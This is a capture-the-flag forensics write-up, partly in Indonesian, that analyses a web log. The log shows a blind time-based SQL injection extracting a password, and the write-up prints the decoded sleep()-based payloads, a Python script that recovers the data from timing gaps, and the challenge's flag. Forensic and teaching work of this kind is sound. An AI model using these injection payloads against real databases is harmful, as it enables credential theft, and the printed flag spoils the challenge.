<h1>Logs analysis - web attack</h1>
<h3>Description</h3>
<label>Our website appears to have been attacked, but our system administrator does not understand web server logs. Can you find out if any data has been stolen ?</label><a href='https://static.root-me.org/forensic/ch13/ch13.txt'>File</a>
<h3>Solution</h3>
<label>Analisa file webserver log, merupakan Bind SQL Injection timming attack</label>
<pre>
12:12:54 ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),1,1),substring(bin(ascii(substring(password,1,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
12:13:00 ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),3,1),substring(bin(ascii(substring(password,1,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
12:13:00 ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),5,1),substring(bin(ascii(substring(password,1,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
12:13:06 ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1)
12:13:10 ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),1,1),substring(bin(ascii(substring(password,2,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
12:13:16 ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),3,1),substring(bin(ascii(substring(password,2,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
12:13:20 ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),5,1),substring(bin(ascii(substring(password,2,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
12:13:22 ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1)
........................................................................................................................................................................................................................................................................
........................................................................................................................................................................................................................................................................
  
Jika 0 Second = 00
Jika 2 Second = 01
Jika 4 Second = 10
Jika 6 Second = 11

Dan Last bit

Jika 0 Second = Null
Jika 2 Second = 0
Jika 4 Second = 1
</pre>

```console
from base64 import b64decode
from datetime import datetime

list_time = []
list_inject = []
file = open('ch13.txt','r').readlines()
dict_key = {0:"00",2:"01",4:"10",6:"11"}
dict_key_last = {2:"0",4:"1"}
for line in file:
    time = line.strip('\n').split('2015:')[1].split(' +')[0]
    data = line.strip('\n').split('=')[-1].split(' HTTP')[0].replace('%3D','')+'=='
    decode = b64decode(data.encode())
    list_time.append(time)
    list_inject.append(decode)
split_bin = 0
binary = ''
for index in range(len(list_time)-1):
    date = "2015-06-18 "
    time1 = datetime.strptime(date+list_time[index], "%Y-%m-%d %H:%M:%S")
    time2 = datetime.strptime(date+list_time[index+1],"%Y-%m-%d %H:%M:%S")
    time_diff = time2 - time1
    split_bin += 1
    if split_bin == 4:
        try:
            binary += dict_key_last[int(str(time_diff)[-1:])]
        except:
            pass
        print(chr(int(binary,2)),end='')
        binary = ''
        split_bin = 0
    else:
        binary += dict_key[int(str(time_diff)[-1:])]
    
```
<h3>Flag</h3>
<pre>
g9UWD8EZgBhBpc4nTSAS
</pre>
